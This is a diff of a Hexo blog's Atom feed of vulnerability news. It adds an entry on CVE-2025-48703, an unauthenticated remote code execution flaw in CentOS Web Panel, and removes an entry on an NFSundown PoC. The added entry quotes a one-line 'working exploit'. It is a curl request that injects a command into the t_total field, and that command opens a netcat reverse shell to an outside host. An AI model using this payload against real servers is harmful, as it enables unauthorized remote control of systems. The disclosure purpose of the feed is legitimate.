@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-02T15:00:27.276Z</updated>
+  <updated>2025-07-02T15:45:14.145Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CentOS Web Panel 未授权远程代码执行漏洞</title>
+    <link href="http://example.com/2025/07/02/github_1170031665/"/>
+    <id>http://example.com/2025/07/02/github_1170031665/</id>
+    <published>2025-07-02T15:45:14.149Z</published>
+    <updated>2025-07-02T15:45:14.145Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> CentOS Web Panel 未授权远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-48703</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> CentOS Web Panel 存在未授权远程代码执行漏洞，攻击者可通过构造特定的请求在目标系统上执行任意命令。</p><p><strong>产品厂商：</strong> CentOS Web Panel</p><p><strong>产品名称：</strong> CentOS Web Panel</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/issues/20344">https://github.com/rapid7/metasploit-framework/issues/20344</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>Unauthenticated remote code execution in CentOS Web Panel - CVE-2025-48703</p><h4 id="Basic-example"><a href="#Basic-example" class="headerlink" title="Basic example"></a>Basic example</h4><p>Working exploit:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs command">$ curl -kis &#x27;https://127.0.0.1:52083/myuser/index.php?module=filemanager&amp;acc=changePerm&#x27; --data &#x27;fileName=.bashrc&amp;currentPath=/home/myuser&amp;t_total=`nc 1.2.3.4 9999 -e /bin/bash`&#x27;<br>$<br></code></pre></td></tr></table></figure><p>Courtesy of <a href="https://fenrisk.com/rce-centos-webpanel">https://fenrisk.com/rce-centos-webpanel</a></p><h4 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h4><p>Unauthenticated one-shot RCE on a popular web management panel is pretty cool.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; CentOS Web Panel 未授权远程代码执行漏洞&lt;/p&gt;
+&lt;p&gt;&lt;st</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
+    
+  </entry>
   
   <entry>
     <title>BlackHatEvents twitter update</title>
@@ -515,33 +542,6 @@
     
     
     <category term="Github Advisory" scheme="http://example.com/tags/Github-Advisory/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>NFSundown 漏洞</title>
-    <link href="http://example.com/2025/07/02/github_2507562211/"/>
-    <id>http://example.com/2025/07/02/github_2507562211/</id>
-    <published>2025-07-02T09:15:27.727Z</published>
-    <updated>2025-07-02T09:15:27.721Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> NFSundown 漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-38089</li></ul><p><strong>漏洞类型：</strong> 其他</p><p><strong>漏洞描述：</strong> PoC for CVE-2025-38089</p><p><strong>产品名称：</strong> NFSundown</p><p><strong>来源：</strong> <a href="https://github.com/keymaker-arch/NFSundown">https://github.com/keymaker-arch/NFSundown</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="NFSundown"><a href="#NFSundown" class="headerlink" title="NFSundown"></a>NFSundown</h2><p>PoC for CVE-2025-38089</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; NFSundown 漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/stro</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
-    
-    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
     
   </entry>
   
